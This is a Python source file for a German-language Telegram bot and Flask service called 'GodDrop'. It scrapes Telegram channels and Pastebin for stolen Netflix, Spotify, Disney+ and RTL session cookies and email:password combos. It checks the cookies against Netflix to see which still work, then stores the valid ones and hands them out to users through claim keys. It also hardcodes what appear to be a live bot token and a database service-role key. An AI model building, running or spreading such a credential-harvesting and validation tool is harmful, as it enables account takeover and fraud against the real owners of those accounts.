import threading
import time
import re
import json
import os
import random
import telebot
from flask import Flask, request, jsonify, render_template
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# DEIN GODDROP BOT TOKEN
BOT_TOKEN = '8980059554:AAGi4797fL5HA4HIfFO74HFhEEmt6A2OoUQ'

# LÖSCHT ALLE ALTEN VERBINDUNGEN
try:
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1", timeout=5)
    time.sleep(2)
except: pass

bot = telebot.TeleBot(BOT_TOKEN)

# SUPABASE DATEN (Service Role Key)
SUPABASE_URL = "https://drrbibjafmqcxqhxswfy.supabase.co" 
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRycmJpYmphZm1xY3hxaHhzd2Z5Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc5MzQ2NjQ2NiwiZXhwIjoyMTA5MDQyNDY2fQ.XElFDbLqZT_bbRP9EomuZlH7gbflUni46fvGvm9hleo"

def get_headers():
    return {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Content-Type": "application/json", "Prefer": "return=representation"}

TELEGRAM_CHANNELS = [
    "freetohell", "Crackers_Official", "internettweaksforum", "netflix_disney_hotstar_nord", 
    "mrplan254", "DARKNET240", "PremiumAccounts_Free", "Combos", "Netflix_Cookies", 
    "Spotify_Premium", "FreeNetflixDaily", "Cookies_Netflix", "Netflix_Account_Drop", 
    "Free_Account_Drop", "NetflixCookiesFree", "NetflixFreebies", "accountsharing", 
    "streamingpartners", "Netflix_Drops", "Spotify_Accounts", "rtl_plus_free", 
    "disney_plus_accounts", "crunchyroll_free"
]

PATTERN = re.compile(r'((?:NetflixId|SecureNetflixId|sp_dc|sp_key|token)=[^;]+)|(https?://(?:www\.)?(?:netflix|spotify|disneyplus|rtlplus)\.(?:com|de)/[^\s]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)', re.IGNORECASE)

def test_item(item):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    try:
        if item.startswith('http'):
            if 'netflix.com' in item:
                return requests.get(item, headers=headers, allow_redirects=False, timeout=5).status_code == 200
            return True
        elif ':' in item and '@' in item: 
            return True 
        else:
            headers['Cookie'] = item
            return requests.get('https://www.netflix.com/browse', headers=headers, allow_redirects=False, timeout=5).status_code == 200
    except Exception:
        return False

def scan_telegram(channel):
    found = []
    try:
        r = requests.get(f"https://t.me/s/{channel}", timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        for m in PATTERN.findall(r.text):
            item = m[0] if m[0] else (m[1] if m[1] else m[2])
            if item: found.append(item)
    except Exception:
        pass 
    return found

def scan_duckduckgo():
    found = []
    try:
        q = 'site:pastebin.com "NetflixId=" OR "sp_dc=" OR "token="'
        r = requests.get(f"https://html.duckduckgo.com/html/?q={q}", timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        soup = BeautifulSoup(r.text, 'html.parser')
        for a in soup.select('.result__a')[:5]:
            url = a['href']
            if 'pastebin.com' in url and '/raw/' not in url:
                raw_url = url.replace('pastebin.com/', 'pastebin.com/raw/')
                raw_r = requests.get(raw_url, timeout=5)
                if raw_r.status_code == 200:
                    for m in PATTERN.findall(raw_r.text):
                        item = m[0] if m[0] else (m[1] if m[1] else m[2])
                        if item: found.append(item)
    except Exception:
        pass
    return found

def grabber_loop():
    while True:
        found_raw = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(scan_telegram, TELEGRAM_CHANNELS)
            for res in results:
                found_raw.extend(res)
                
        found_raw.extend(scan_duckduckgo())
        found_raw = list(set(found_raw)) 
        
        if found_raw:
            valid = []
            for item in found_raw:
                if test_item(item):
                    valid.append(item)
            
            if valid:
                for item in valid:
                    platform = "netflix"
                    if "spotify" in item.lower() or "sp_dc" in item.lower(): platform = "spotify"
                    elif "disney" in item.lower(): platform = "disney"
                    elif "rtl" in item.lower(): platform = "rtl"
                    elif ':' in item and '@' in item: platform = "combo"
                    
                    newKey = 'CLM-' + os.urandom(4).hex().upper()
                    meta = {"email": "Token/Login", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
                    requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": platform})
                    
        time.sleep(60)

def bot_loop():
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        bot.reply_to(message, "Willkommen bei GodDrop!\nSende /key netflix oder /key spotify")

    @bot.message_handler(commands=['key'])
    def send_key(message):
        try:
            args = message.text.split()
            platform = args[1].lower() if len(args) > 1 else "netflix" 
            r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.{platform}&limit=1", headers=get_headers())
            if r.status_code == 200 and r.json():
                bot.reply_to(message, f"Dein {platform.capitalize()} Key: `{r.json()[0]['key']}`\n\nLöse ihn ein: https://multi-cloud-final.onrender.com", parse_mode='Markdown')
            else:
                bot.reply_to(message, f"❌ Keine {platform.capitalize()} Accounts verfügbar.")
        except Exception as e: bot.reply_to(message, f"Fehler: {e}")
    bot.polling(non_stop=True)

threading.Thread(target=grabber_loop, daemon=True).start()
threading.Thread(target=bot_loop, daemon=True).start()

@app.route('/')
def home(): return render_template('index.html')

@app.route('/api/claim', methods=['POST'])
def claim():
    data = request.json
    r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{data.get('key')}&used=eq.false&data=not.is.null", headers=get_headers())
    if r.status_code == 200 and r.json():
        k = r.json()[0]
        requests.patch(f"{SUPABASE_URL}/rest/v1/keys?id=eq.{k['id']}", headers=get_headers(), json={"used": True})
        return jsonify({"success": True, "data": k['data'], "meta": k['metadata'], "platform": k.get('platform', 'unknown')})
    return jsonify({"success": False, "msg": "Key ungültig oder leer!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
